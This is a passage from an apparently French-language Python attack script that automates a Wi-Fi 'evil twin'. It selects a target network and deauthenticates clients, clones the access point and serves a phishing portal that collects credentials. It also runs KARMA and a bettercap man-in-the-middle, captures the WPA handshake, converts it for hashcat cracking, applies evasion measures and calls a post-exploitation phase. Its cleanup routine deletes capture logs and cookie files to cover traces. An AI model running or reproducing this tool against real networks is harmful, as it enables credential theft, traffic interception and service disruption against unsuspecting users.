        pid = globals().get(pid_var)
        if pid:
            try:
                os.kill(pid, signal.SIGTERM)
            except:
                pass
    # pkill
    subprocess.call(["pkill", "-f", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "php"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "mdk4"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "xterm"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Iptables
    subprocess.call(["iptables", "-t", "nat", "-F"])
    subprocess.call(["iptables", "-F"])
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    # Monitor
    if MON_INTERFACE:
        subprocess.call(["airmon-ng", "stop", MON_INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["ip", "link", "set", MON_INTERFACE, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["iw", "dev", MON_INTERFACE, "del"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Restauration MAC
    if INTERFACE and ORIGINAL_MAC:
        subprocess.call(["ip", "link", "set", INTERFACE, "down"], stderr=subprocess.DEVNULL)
        subprocess.call(["macchanger", "-m", ORIGINAL_MAC, INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["ip", "link", "set", INTERFACE, "up"], stderr=subprocess.DEVNULL)
    # Suppression fichiers temporaires
    for fpath in [HOSTAPD_CONF_PATH, DNSMASQ_CONF_PATH]:
        if fpath and os.path.exists(fpath):
            try:
                os.unlink(fpath)
            except:
                pass
    if CAPTURE_FILE:
        for ext in ["-01.cap", "-01.kismet.csv"]:
            try:
                os.unlink(CAPTURE_FILE + ext)
            except:
                pass
    if PHISHING_DIR and os.path.exists(PHISHING_DIR):
        shutil.rmtree(PHISHING_DIR, ignore_errors=True)
    # Supprimer logs (Phase 7)
    for f in ["/tmp/bettercap_sniff.pcap", "/tmp/capture.log", "/tmp/deauth.log", "/tmp/cookies.txt"]:
        if os.path.exists(f):
            try:
                os.unlink(f)
            except:
                pass
    log("Nettoyage terminé.")
    sys.exit(0)

# ========== MAIN ==========
def main():
    global INTERFACE, MON_INTERFACE, TARGET_BSSID, TARGET_ESSID, TARGET_CHANNEL, TARGET_BAND, TARGET_ENCRYPTION
    global PHISHING_DIR, CAPTURE_FILE, TARGET_CLIENTS, MONITOR_THREAD

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    check_root()
    check_deps()

    # --- Phase 1 : Reconnaissance ---
    INTERFACE = select_interface()
    MON_INTERFACE = enable_monitor(INTERFACE)

    networks = scan_networks(MON_INTERFACE)
    display_networks(networks)
    TARGET_BSSID, TARGET_ESSID, TARGET_CHANNEL, TARGET_BAND, TARGET_ENCRYPTION = select_target(networks)
    log(f"Cible sélectionnée: {TARGET_ESSID} ({TARGET_BSSID}) canal {TARGET_CHANNEL} ({TARGET_BAND})")

    # Sondes clients
    probes = probe_clients(MON_INTERFACE)
    if probes:
        print("\n\033[93mSondes clients détectées:\033[0m")
        for client, essid in probes:
            print(f"  {client} cherche '{essid}'")
        # On peut ajouter automatiquement les clients de la cible ?
    # Récupération des clients associés à la cible (depuis le scan)
    for net in networks:
        if net[0] == TARGET_BSSID:
            # net[5] est le nombre de clients, mais on n'a pas les MACs
            # On demande à l'utilisateur d'entrer les MACs à cibler
            break

    print("\n\033[93mPhase 3 : Déauth ciblée.\033[0m")
    client_input = input("Entrez les MAC des clients à déauthentifier (séparés par des espaces, ou laissez vide pour broadcast): ")
    if client_input.strip():
        TARGET_CLIENTS = [mac.strip() for mac in client_input.split()]
    else:
        TARGET_CLIENTS = []  # broadcast

    # --- Phase 2 : Déploiement Rogue AP ---
    # Configuration IP
    subprocess.call(["ip", "addr", "add", "192.168.66.1/24", "dev", MON_INTERFACE], stderr=subprocess.DEVNULL)
    subprocess.call(["ip", "link", "set", MON_INTERFACE, "up"])

    setup_iptables(MON_INTERFACE)
    start_dnsmasq(MON_INTERFACE)
    clone_ap(MON_INTERFACE, TARGET_ESSID, TARGET_BSSID, TARGET_CHANNEL, TARGET_BAND, TARGET_ENCRYPTION)

    # --- Phase 4 & 5 : Services et Phishing ---
    PHISHING_DIR = generate_phishing_portal(TARGET_ESSID)
    start_web_server(PHISHING_DIR)

    # --- Phase 6 : KARMA ---
    enable_karma(MON_INTERFACE, TARGET_ESSID)

    # --- Phase 3 (déauth) et capture handshake ---
    CAPTURE_FILE = tempfile.NamedTemporaryFile(prefix="handshake_", suffix=".cap", delete=False).name
    start_deauth_xterm(MON_INTERFACE, TARGET_BSSID, TARGET_CHANNEL, TARGET_CLIENTS)
    start_capture_xterm(MON_INTERFACE, TARGET_BSSID, TARGET_CHANNEL, CAPTURE_FILE)

    # --- Phase 5 : MITM (Bettercap) ---
    start_bettercap_xterm(MON_INTERFACE)

    # --- Phase 7 : Évasion ---
    apply_evasion_measures(MON_INTERFACE)

    # Attente handshake
    handshake_ok = wait_for_handshake(CAPTURE_FILE, TARGET_BSSID)

    if handshake_ok:
        cleaned, hash_file = clean_and_convert_handshake(CAPTURE_FILE, TARGET_BSSID)
        if hash_file:
            print("\n" + "=" * 60)
            print("✅ RÉSUMÉ DES FICHIERS GÉNÉRÉS:")
            print(f"  - Handshake brut: {CAPTURE_FILE}-01.cap")
            print(f"  - Handshake nettoyé: {cleaned}")
            print(f"  - Hash 22000: {hash_file}")
            print("\n  Commande Hashcat:")
            print(f"  hashcat -m 22000 {hash_file} /usr/share/wordlists/rockyou.txt")
            print("=" * 60)

    # --- Phase 8 : Post-exploitation ---
    post_exploit()

    # Lancer le monitoring
    MONITOR_THREAD = threading.Thread(target=monitor_clients, daemon=True)
    MONITOR_THREAD.start()

    print("\n" + "=" * 60)
    print("🟢 EVIL TWIN + MITM EN COURS")
    print(f"  - Portail phishing: http://192.168.66.1 (HTTPS:443)")
    print(f"  - Crédentials: {CRED_FILE}")
    print("  - Fenêtres Xterm: déauth, capture, bettercap")
    print("  - Appuyez sur Ctrl+C pour arrêter")
    print("=" * 60)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()

if __name__ == "__main__":
    main()
